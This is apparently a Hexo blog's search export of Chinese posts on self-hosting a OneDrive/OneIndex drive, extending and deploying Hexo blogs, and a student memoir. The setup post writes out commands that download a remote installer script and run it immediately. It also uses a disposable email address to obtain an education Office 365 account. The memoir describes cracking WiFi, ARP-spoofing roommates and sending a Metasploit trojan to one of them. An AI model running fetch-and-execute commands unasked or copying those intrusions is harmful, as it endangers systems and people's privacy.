    <url>%2F2019%2F08%2F09%2Fonedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98%2F</url>
    <content type="text"><![CDATA[0x00 前言​ 前几天在别人的博客中看到有自己搭建的个人专属网盘，看起来还不错的样子，然后了解到是用onedrive+oneindex来实现的，所以自己也通过在网上学习一些相关的文章，并且搭建成功了，所以在这里分享一下搭建的流程，一来是给自己的总结，二来是分享给需要的朋友。 0x01 环境准备 环境需求： 1.vps一个 2.宝塔面板环境，Nginx，PHP需要5.6以上版本 3.onedrive 5T空间 4.oneindex 5.域名一个 1.1 vps购买访问vps购买地址选择经济实惠的Linux VPS 然后拉到最底下，选择kvm的vps，当然选择openVZ的也可以。 选择第一个2.5刀的 选择操作系统和带宽 选择vps的位置，然后加入购物车 结账 填写相关信息，然后选择支付宝付款 1.2 宝塔面板的安装entos安装命令： 1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh Ubuntu/Deepin 安装命令： 1wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh Debian安装命令： 1wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh Fedora安装命令: 1wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh 1.3 Nginx和PHP的安装​ 安装完宝塔面板后，在浏览器中输入vpsip:8888进入宝塔面板，登陆的账号密码在成功安装宝塔后会有提示，根据提示输入登陆就好了，一般情况下第一次登陆宝塔会提示让你安装LNMP环境或者LAMP环境，我们选择安装Nginx+PHP5.6就好了，mysql和phpmyadmin不需要安装 安装的进度如下，耐心等待安装完成即可。 0x02 注册365邮箱​ 临时邮箱网址：https://t.odmail.cn/ 复制网页中的邮箱然后选择 学生版 or 教师版 在注册,记住，页面不要关闭，待会需要接收验证码 输入刚刚的邮箱 返回刚刚临时邮箱的页面，接收到验证码了 输入验证码 输入相关信息完成注册 需要用手机号验证一下 注册完成 0x03 安装oneindex3.1 注册域名域名注册地址直接购买，不懂的，出门右拐百度 3.2 设置域名解析在域名管理中设置域名解析 A记录指向是自己的vps ip地址pan是域名的二级域名，也就是pan.xxx.com 3.3 安装oneindex注册好了onedrive以后，我们现在有5T的空间了，具体有没有5T，会在后面上传的部分介绍如何查看 首先需要下载oneindex的源码，GitHub下载地址：onindex 然后登陆宝塔面板，配置一下 填写自己注册的域名 点击进入网站目录 然后刚刚下载的oneindex源码上传上去，也可以使用远程下载直接远程下载oneindex的源码，如果是自己上传的，需要解压缩一下，解压完以后如下图： 然后访问自己的域名直接安装，必须全部都是√才行，如果3,4的权限不够需要在宝塔面板中赋予该文件夹可读可写的权限 都是√的可以跳过不看这个 重新回到宝塔面板给需要赋予权限的两个文件夹赋权 再次刷新，OK，都是√了， 0x04 oneindex的基本设置输入域名/?/admin进入oneindex后台管理系统，初始密码是oneindex 修改网盘的名称 在宝塔中设置定时刷新缓存计划 在宝塔面板中添加计划任务 0x05 文件上传​ 为了方便我们上传文件到网盘中，我们需要用到RaiDrive将网盘映射到本地计算机中，当做本地磁盘来使用，具体操作如下：RaiDrive下载:官网地址,蓝奏云盘 下载完以后就是一步步安装了，傻瓜式操作，下面主要讲一下安装完以后如何将网盘映射到本地 首先，安装好的RAIDrive是英文的，不习惯得话可以设置成中文，如图 然后将网盘映射到本地，操作如下 点击接受 耐心等待一会以后 0x06 碰到的问题3.4 授权5T空间的时候碰到错误问题描述： 问题原因： 没有使用开通5T onedrive空间的账号登陆 解决方法： 如果有5T 的onedrive空间的账号，直接使用该账号登陆即可，如果没有的话，需要自己重新注册一个即可。 3.5 网盘文章打开404问题描述： 上传到网盘的文件，点击打开以后显示404 问题原因： 没有设置伪静态，导致访问文件时找不到资源文件。 解决方法： 设置好以后再次访问域名，发现里面的文件夹和文件都可以直接点击查看 3.6 解决图片打开是404问题将伪静态替换成下面 1234567891011rewrite ^./files/(.) /wp-includes/ms-files.php?file=1 last;if (!-e $request_filename)&#123;rewrite ^.+?(/wp-.*) $1 last;rewrite ^.+?(/.*.php)$ $1 last;rewrite ^ /index.php last;&#125; 成功访问 参考链接： https://www.52pojie.cn/thread-847650-1-1.html https://github.com/donwa/oneindex https://blog.csdn.net/github_39533414/article/details/83687260 https://www.moerats.com/archives/592/ http://www.sumbk.com/339.html http://blog.jialezi.net/?post=120]]></content>
      <categories>
        <category>教程</category>
        <category>好玩</category>
      </categories>
      <tags>
        <tag>oneindex</tag>
        <tag>onedrive</tag>
        <tag>个人网盘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[给博客添加豆瓣书架功能]]></title>
    <url>%2F2019%2F08%2F09%2F%E7%BB%99%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E8%B1%86%E7%93%A3%E4%B9%A6%E6%9E%B6%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[0x00 前言在一次浏览个人博客网站的过程中，返现有个网站有豆瓣读书的功能，可以在页面展示自己读了哪些书，想看哪些书等，我觉得这个功能特别的好，可以记录自己的读书，还可以在读完以后写上自己的书评。下面来给大家讲讲怎么在自己的博客中实现这个功能。 #0x01 成品展示 #0x02 需求配置 ##2.1 安装插件 在博客的根目录下输入命令安装 npm install hexo-douban --save ##2.2 站点配置文件中添加配置 在Hexo站点根目录配置文件_config.xml中的末尾添加如下配置： 12345678910111213douban: user: mythsman builtin: false book: title: 'This is my book title' quote: 'This is my book quote' movie: title: 'This is my movie title' quote: 'This is my movie quote' game: title: 'This is my game title' quote: 'This is my game quote' timeout: 10000 上面参数说明： user: 你的豆瓣ID.打开豆瓣，登入账户，然后在右上角点击 “个人主页” ，这时候地址栏的URL大概是这样：”https://www.douban.com/people/xxxxxx/“ ，其中的”xxxxxx”就是你的个人ID了。 builtin: 是否将生成页面的功能嵌入hexo s和hexo g中，默认是false,另一可选项为true(1.x.x版本新增配置项)。 title: 该页面的标题. quote: 写在页面开头的一段话,支持html语法. timeout: 爬取数据的超时时间，默认是 10000ms ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。 由于hexo-douban是默认抓取豆瓣读书、豆瓣电影以及豆瓣游戏的，如果只想要其中一部分，可以把其它部分在上述配置文件中去掉即可。 0x03 启用使用插件安装好了，需要配置的也配置好了，下面就需要生成我们的豆瓣书架、电影页面了。 ##3.1 生成页面 在GitBash下输入命令： 1234567hexo clean #清除之前生成的文件hexo douban -bmg #生成豆瓣书籍、电影、游戏页面hexo g #生成文章hexo s #启动本地服务器hexo deploy #上传部署#-bgm代表的是book、game、movie三个参数，如果只需要其中的一部分就只带你想要的那些参数。 注：由于hexo douban的简写也是hexo d，与hexo deploy的简写指令hexo d冲突，因此在进行二者部署的时候，只能都打全名而不能打简写形式 ##3.2 测试 如果在hexo douban -bmg这步没有问题的话，会出现如下信息 然后我们只需要在站点目录下测试http://localhost:4000/books 或者 http://localhost:4000/movies等，如果看到页面了就说明成功了。 ##3.3 配置 如果上述都没有问题，我们就可以在菜单栏中添加按钮了，打开主题配置文件_config.xml，找到菜单按钮，可以选择性的添加下面内容： 123456menu: home: / archives: /archives books: /books # 这是链接到books页面 movies: /movies # 这是链接到movies页面 games: /games # 这是链接到games页面 注意添加完成之后按钮并不是中文的，这是由于在languages文件夹下面的zh-CN（中文语言配置文件）没有添加上述对应的中文参数信息，所以我们需要主动添加,语言文件夹在你的主题配置文件夹下面，如下图 在menu菜单下添加： 1234menu: books: 阅读 movies: 电影 games: 游戏 #0x04 碰到的问题 输入hexo douban -bg以后，发现没有按照教程一样产生相关的页面 在网上百度，Google了好久都没有相关的问题，只有相关的教程，也重装了无数次，还是不成功，但是这个插件明明是支持next主题的，所以我就在虚拟机里面重新搭建了一个干干净净的博客，然后安装上这个插件后，发现可以正常产生页面的。 所以断定，肯定是我的博客配置出现了问题而不是插件的问题了，在精确定位一下问题：要么是主题的配置的问题，要么的hexo的配置问题，要么是可能去之前安装的功能插件冲突。 通过将原始的配置复制到我的博客中，发现产生，同构将我博客中的配置文件复制到原始的配置中，发现不能产生，从而断定了问题是出在hexo的站点配置文件中，因为我直接将新的站点配置文件复制进去是可以正常产生页面的。所以在进一步排查到底是站点配置文件中的什么配置出了问题。 最后查出，原来是douban:前面多了空格，必须要顶格才行。 再次运行hexo douban -bmg成功生成books和games页面。 #0x05 参考链接 https://github.com/mythsman/hexo-douban]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>豆瓣书架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[github+hexo+域名搭建一个自己的网站]]></title>
    <url>%2F2019%2F08%2F09%2Fgithub-hexo-%E5%9F%9F%E5%90%8D%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[0x00 前言​ 在一次无意的搜索文章中，看到了一个特别好的网站，不管是前端还是网站的内容都做的非常吸引人。我一开始以为是WordPress搭建的个人博客，后台得知使用hexo+GitHub来搭建的，顿时心中的博客火又燃了起来。$_$因为我之前也用WordPress搭建过自己的博客，但是由于需要购买阿里云的服务器，这对于我这个穷人来说是一笔开销，所以在服务器到期以后就没有在续费了，而hexo+GitHub搭建的是完全免费的，利用的是GitHub page，然后hexo将我们写的博客渲染成静态页面在部署到GitHub中去，最后在前端展现出来。下面就给大家介绍一个搭建的过程。 #0x01 环境准备 需要的东西： node.js git hexo GitHub账号 域名 ##1.1 node和git的安装 Node.js下载](http://nodejs.org/) ，Git下载 ，下载完成以后，直接傻瓜式下一步安装即可。 按win+R 输入cmd命令来检查是否安装成功 12node -v #查看node版本git -v #查看git版本 出现下图说明安装成功 ##1.2 hexo的安装 首先需要新建一个空的Blog文件夹，可以在任意盘符右击新建个文件夹，也可以通过cmd命令来完成 输入Blog文件夹下输入npm install hexo -g安装hexo（速度根据你的实时网速） 输入hexo -v，检查hexo是否安装成功 输入hexo init，初始化该文件夹（需要等待一会） 输入npm install，安装所需要的组件 输入hexo g（=hexo generate），生成静态页面 输入hexo s（=hexo server），开启服务器，访问该网址，正式体验Hexo 访问http://localhost:4000 出现下图，说明本地搭建成功 命令总结： 123456hexo -v #查看hexo版本hexo init #初始化hexohexo install #安装hexohexo g #将文章渲染成静态页面hexo s #启动本地hexo服务器hexo d #部署到GitHub（后面介绍） 1.3 注册GitHub账号注册地址：github 输入用户名，邮箱和账号密码后点击注册，进入第二步 选择免费个人版 去刚刚注册的邮箱验证一下即可 1.4 购买域名购买域名是为了将GitHub的默认域名解析到自己的域名下，这样以后就可以直接访问自己的域名了，不需要在输入GitHub的默认域名了。 腾讯注册域名传送门 阿里云注册域名传送门 0x02 搭建hexo博客2.1 配置GitHub首先需要创建一个新的repository仓库， ​ 一直往下拉，找到GitHub pages 访问链接效果如下： 将Hexo与Github page联系起来，设置Git的user name和email（如果是第一次的话） 分别输入： 12git config --global user.name "madcoding"git config --global user.email "madcoding@163.com" 注：这里“madcoding”可以替换成自己的用户名，邮箱可以替换成自己的邮箱 输入ssh-keygen -t rsa -C “madcoding163.com”连续三个回车，生成密钥，最后得到了两个文件：id_rsa和id_rsa.pub（默认存储路径是：C:\Users\Administrator.ssh）。 输入eval &quot;$(ssh-agent -s)&quot;，添加密钥到ssh-agent 再输入ssh-add ~/.ssh/id_rsa，添加生成的SSH key到ssh-agent 在目录C:\Users\Administrator.ssh下载，找到下面两文件 用记事本打开id_rsa.pub，复制里面的内容 添加成功 继续在Git bash中输入ssh -T git@github.com 然后输入两次yes，返回下图说明连接成功 2.2 自定义域名设置在Blog的source目录下，新建一个CANME文件，具体操作如下 在cmd窗口中输入ping 用户名.github.io 得到GitHub分配的一个公网ip地址，记下这个地址 ##2.3 设置域名解析 然后到阿里云购买好的域名中心，设置域名解析，下面是设置好的结果 设置步骤： ##2.4 配置部署 在Blog的根目录下，找到_config.yml文件，修改repo值（在末尾） 在Git bash中输入hexo new post “test” 这时，可以在source文件下的_posts文件夹中看到刚刚新建的test文件，写文章可以直接在该文档中去写 在生成以及部署文章之前，需要安装一个扩展： npm install hexo-deployer-git –save 使用编辑器编好文章，那么就可以使用命令：hexo g 来生成静态的文档 然后使用hexo d 来部署到GitHub中 如果点击login后dos界面没有反应，按一下enter键就好了 出现下图，部署成功 0x03 美化博客3.1 跟换主题1.可以直接去hexo官方主题库中去找一个自己喜欢的主题去下载，然后下载完成后复制到themes文件夹下。传送门 2.在Blog目录下，右击，点击Git bash here，然后输入 git clone https://github.com/shenliyang/hexo-theme-snippet.git 3.2 博客导航栏设置直接在博客主题目录下设置即可，在zh-CN中设置也可以。 ​ 效果显示 3.3 分类设置虽然我们在主题中设置了导航栏，但是却没有给导航栏设置对应的页面，所以点击的时候是不能正常显示的。 3.3.1 添加分类列表在项目根目录下，执行下面的命令行，新建分类页面，然后会在项目根目录下的 source 文件夹中新建一个 categories 文件夹。 1hexo new page categories 打开 categories 文件夹中的 index.md 文件，添加 type 字段，设置为 “categories”。如下图所示。 接着到主题文件夹下的 _config.yml 配置文件下，找到 menu 模块，把 categories 的注释给去掉。如下图所示。 刷新页面（如果刷新没效果，可以重启服务），可以在页面左侧栏上看到多了一个“分类”列表。 3.3.2 如何将文章添加到对应分类？文章发布前，在 front-matter 部分，多写一个 categories 字段，然后参数写上类别的名称，保存后重启服务，在网页上点击“分类”，可以看到分类下已经生成了刚刚设置的类别，并把刚刚发布的文章归类在此类别下。如下图所示。 3.4 标签设置方法跟分类设置原理一样，这里就不在重复介绍了，需要注意一点的是格式问题。 3.5 Hexo 博客添加站内搜索蝴蝶主题支持Algolia，Local Search，这就给大家介绍一些Local Search，因为这个配置简单，-&gt; -&gt;。注意：安装的时候要是项目根目录下安装。 安装 hexo-generator-search 1npm install hexo-generator-search --save 安装 hexo-generator-searchdb 1npm install hexo-generator-searchdb --save 在项目根目录下的 _config.yml 配置文件的文末添加下面这段代码。 12345search: path: search.xml field: post format: html limit: 10000 编辑主题文件夹的 _config.yml 配置文件，设置 Local searchenable 为 ture。 效果图 0x04 其他功能0x05 采坑指南5.1 端口占用问题假如页面一直无法跳转，那么可能端口被占用了。此时我们ctrl+c停止服务器，接着输入“hexo server -p 端口号”来改变端口号 5.2 npm install hexo -g出现问题 解决方法： 然后再次执行npm install hexo -g 5.3 ssh-key配置失败首先，清除所有的key-pair 12ssh-add -Drm -r ~/.ssh 删除你在github中的public-key,重新生成ssh密钥对 1ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot; 接下来正常操作 在github上添加公钥public-key: 1、首先在你的终端运行xclip -sel c ~/.ssh/id_rsa.pub将公钥内容复制到剪切板 2、在github上添加公钥时，直接复制即可 3、保存 删除你在github中的public-key 重新生成ssh密钥对 1ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot; 测试： 在终端 ssh -T git@github.com 5.4 发布文章时出现问题###5.4.1 问题描述 使用hexo d -g命令发布文章使，出现如下问题 YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1: 5.4.2 问题原因在发布文章的md文件里面开头的文件头没有加空格如下： 5.4.3 解决方法加上空格后，重新编译，没有出错（记得保存） 重新编译，完成部署 5.5 输入hexo generate或者其他hexo的命令时出现下面的问题5.5.1 问题描述 5.5.2 问题原因yml的配置文件中国，冒号后面需要有空格，如下： 5.5.3 解决方法 保存后重新运行，没报错，空格真的是大坑。 5.6 部署博客没有CSS5.6.1 问题描述在本地server成功，显示没有问题 但是部署到github上之后，就无法显示主题和图片了 5.6.2 解决方法更改一下_config.yml文件，其中的url和root属性。 12ur: http://www.nideyuming.com/blog/root: /blog root 下面应该设置成 /你的项目名 而不是/ 然后重新部署一下就成功了。 5.7 GitHub配置个人域名出现问题5.7.1 问题描述 5.7.2 解决方法 5.8 npm install安装依赖出现问题5.8.1 问题描述npm WARN babel-eslint@10.0.1 requires a peer of eslint@&gt;= 4.12.1 but none is installed. You must install peer dependencies yourself. 5.8.2 解决方法 ##5.9 输入自己后买的域名后访问是404 5.9.1 问题描述 但是使用github的默认域名可以正常访问，所以问题出在了域名解析和站点配置的问题上了 先考虑重置设置一下域名解析的记录，将 重新设置好了域名解析，但是还是出现404，我TM。。。。 行，那就是站点配置上面的错误了，在hexo生成的博客的source目录下新建一个 CNAME 文件，然后在这个文件中填入你的域名，这样就不会每次发布之后，gitpage里的 customdomain都被重置掉啦。 重新部署后，在GitHub中会出现CNAME，说明设置成功了 0x06 参考链接https://www.cnblogs.com/fengxiongZz/p/7707219.html https://www.simon96.online/2018/10/12/hexo-tutorial/ https://blog.csdn.net/liuyongshun2/article/details/54629087 https://jerryc.me/posts/21cfbf15/#%E5%BF%AB%E9%80%9F%E9%96%8B%E5%A7%8B]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>github</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自定义hexo创建文章的模板]]></title>
    <url>%2F2019%2F08%2F02%2F%E8%87%AA%E5%AE%9A%E4%B9%89hexo%E5%88%9B%E5%BB%BA%E6%96%87%E7%AB%A0%E7%9A%84%E6%A8%A1%E6%9D%BF%2F</url>
    <content type="text"><![CDATA[#0x00 前言 在众多的博客中，我选择了hexo，最大的优势就是可以结合GitHub page来搭建一个免费的个人博客系统，将文章都托管到GitHub上，在也不用担心服务器过期的问题了，而且可以自己买一个域名，解析了GitHub上就可以直接使域名访问了。很多小伙伴给自己个博客添加了很多其他的功能，但是每次写文章的时候都需要在文章的开头去写一遍，这简直就是重复造轮子。其实，你可以自己在scaffolds中去修改属于你自己的模板 #0x01 目录了解 123456789101112131415161718192021hexo-install-directory├── CNAME├── _config.yml //Hexo的配置文件，可以配置主题、语言等├── avatar.jpg├── db.json├── debug.log├── node_modules├── public //执行hexo g命令后，生成的内容会在这里，包括所有的文章、页面、分类、tag等.├── scaffolds //保存着默认模板，自定义模板就是修改该目录下的文件│ ├── draft.md //默认的草稿模板│ ├── page.md //默认的页面模板│ └── post.md //默认的文章模板├── source //Hexo存放编辑页面的地方，可以使用vim或其他编辑器编辑这里的内容│ ├── 404.html //自定义404页面，可以使用腾讯公益404页面│ ├── Staticfile │ ├── _drafts //存放所有的草稿文件的目录│ ├── _posts //存放所有的文章文件的目录，用的最多，比如执行hexo n "post_name"之后，post_name这篇文章就存放在这个目录下│ ├── categories└── themes //Hexo的所有主题 ├── landscape //原始hexo主题 ├── next //这是我目前用的主题 0x02 修改步骤在博客的scaffolds目录下有三个md文档，只需要改post.md即可。 我的模板 1234567891011121314151617181920212223242526272829303132----title: &#123;&#123; title &#125;&#125; //文章标题date: &#123;&#123; date &#125;&#125; //文章创建时间permalink: //文章显示连接categories: //文章匪类目录tags: [] //文章标签，可多个，用，隔开description: //文章描述image: //自定义的文章摘要图片，只在页面展示，文章内消失copyright: true //增加底部的版权信息（需要配置）-----//首页文章展示缩略图&lt;img src=&quot;https://&quot; alt=&quot;&quot; style=&quot;width:100%&quot; /&gt; 0x00 前言&lt;!-- more --&gt;## 0x01 ## 0x02## 0x03## 0x04&lt;hr /&gt;版权信息 模板图片如下: #0x03 效果展示 首页预览 文章详情 版权信息 ##]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>文章模板</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的大学生活]]></title>
    <url>%2F2019%2F07%2F01%2F%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%B4%BB%2F</url>
    <content type="text"><![CDATA[#0x00 前言 ​ 我大学读的是计算机科学与技术专业，说实话，这个专业真的太大了，囊括了整个计算机的大类，所以学校的课程中，什么都学，什么计算机导论，离散数学，Java，C，C#，数据库，JSP等等，但是教的都是一些基本的皮毛知识，有些连入门都不算，所以要想在某个知识有所突破，基本上都是靠自己去图书馆借书回来学习。 ​ 在大学中，如果按照学习来分类的话，有这么几个人。第一类人——学神，听过这类人特别牛X，不光学习好，年年拿国家励志奖学金，而且还有这种职位，比如学社会主席，某某大赛领队人….；第二类人——学霸，他们是上课认真听讲，课下不用复习，靠前突击复习。期末稳稳优秀，我宿舍就有几个，哈哈哈，我们宿舍在班上也算是男生中的学霸宿舍了；第三类人——学渣，他们是上课玩手机，下课打游戏，吃饭叫外卖，考试靠小抄。 0x01 大一​ 大一小萌新，充满着对大学的憧憬，然后大一也是最惨的，学生会中部长对大一干部喝来喝去，一副官腔样，贼恶心。除了这些大一小萌新还会在志愿者协会参加各种户外和校内的志愿者活动，只为了志愿者证书上的那60小时志愿工时，不过我在大一的时候为了多见见世面，参加了不少志愿活动，大大小小的积累下来有100多个工时。不过最后被我弄丢了╮(╯▽╰)╭然后就是我在大学还参加一个社团叫剪纸协会（非物质文化遗产奥），不过我在里面也是混日子，没有学到多少技能，到是吧脸皮练厚了，哈哈哈。这就样大一结束。 #0x02 大二 ​ 大二，学习上的事就暂且不谈了，都一样，周一周五上课，周六周日放假。不过不同的人大二的生活就开始不一样了。要是说很多人在大一的时候都差不多，一起参加了学生会，社团什么的，到了大二以后，换届的换届，退会的退会，有幸的是，我当上了剪纸协会的副会长，一般一个社会会有4个负责人，1个会长，两个副会长，还有一个理事长。反正都是管事的，每次社团需要举办什么活动，我们几个负责人都要讨论一下活动的举办等等一系列问题，话说，举办活动还是挺有意思的，不过举办活动前后事情也是挺多的。需要外联部去拉赞助，需要组织部写策划案，需要剪纸部和纸艺创作部出作品展览，协调活动现场人员情况等等。就这样，大二我除了每天上课以外，其余的时光都是在协会中度过了，不过我喜欢去图书馆借点书在协会里面看书，一个人安静的看书，还有空调，也是一种享受！皮卡皮卡^v^ 。 ​ 在一次偶然的机遇中，我碰到了学校计算机协会的会长，在于他交流的过程中，他和我讲了一些有关黑客的东西，其中就涉及到了各种技术，什么ip定位（小皮毛），渗透测试、kali Linux等，当时的我是第一次接触到渗透测试这个词，也没有听过kali Linux，只知道有软件测试和Linux系统这么一回事。当我从百度中搜索了有关这些词的信息后，开启了我新世界的大门。为了学习渗透，我在虚拟机中装上了kali Linux，这个过程在我摸索的过程了还是碰到了不少坑的，这里就不说了，装上kali Linux以后，第一个想法就是，我该怎么用，怎么去和电影里面的一样去黑别人的电脑？等等，于是在网上搜索了一些相关的资料和视频，开始学习kali Linux，其中，我研究最多的模块就是内网了，其实实际上就是局域网环境内的攻击，这些我是先拿我宿舍的室友和路由器开的刀，先是研究如何破解WiFi密码，然后破击成功后使用nmap扫描内网存活主机，使用arp欺骗局域网的主机，窃取局域网中用户的数据流量等等（这些其实不懂，就是跟着视频操作一遍，照葫芦画瓢，不懂原理），再去使用nessus扫描主机存在的漏洞，最后利用漏洞攻击系统等等（未成功过。:( ），在无线网破解这部分我曾经还在freebuf上发表一篇文章——如何使用Airgeddon找回WiFi密码 ，这篇文章从技术研究，文章的撰写发布花了我好几天的时间，在写文章的那天弄到3点在写完成，不过最后发表了，很开心。大二就说这么多吧，其他的大三再说。 #0x03 大三 ​ 时间很快，我到了大三，大三上学期不知道怎么回事，课少的可怜，所以我就有更多的时间来研究渗透测试的东西了，这段时间我研究了msf中的木马，具体技术也不是很懂，就是利用命令来生成木马，然后将木马发送给受害者，只要受害者点击了以后，我这边就可以反弹回来一个会话，俗称shell，在这里，我可以查看该用户主机中的所有信息（管理员权限），当初就是将这个给我的一个室友演示的，成功让他上船。然后两个人一起研究渗透测试，免杀，Android马等等，只是当初思维比较局限，不知道web层面的渗透，只知道有日战这么一说，但是具体的也不知道怎么日。。。。 ​ 大三下学期的课与上学期的课形成了鲜明的对比，基本上天天满课，有的时候晚上还要上课，这，让我在渗透测试方面的研究方面的研究时间大大减少，而且我在大三还萌生了考研的想法，所以，学习任务繁重啊。╮(╯▽╰)╭，不过幸运的是，我在大三过了六级，低分飘过，过了三级网络技术，还拿到了国家励志，也算是我的幸运之年了。皮卡皮卡(^__^) #0x04 大四 ​ 考研，考研失败，经历就不分享了，免得误导小朋友。不过给出建议就是坚持，很多人在考研的后期都奔溃了，时间不够用，没有复习完，考场心态爆（我在考数学的时候心态崩过，然后出去洗把脸换个位置调整过来了），所以，一定要坚持，怎么也得熬到考研结束。说不定，你就成功了。哇咔咔！！！]]></content>
      <categories>
        <category>记录生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
</search>
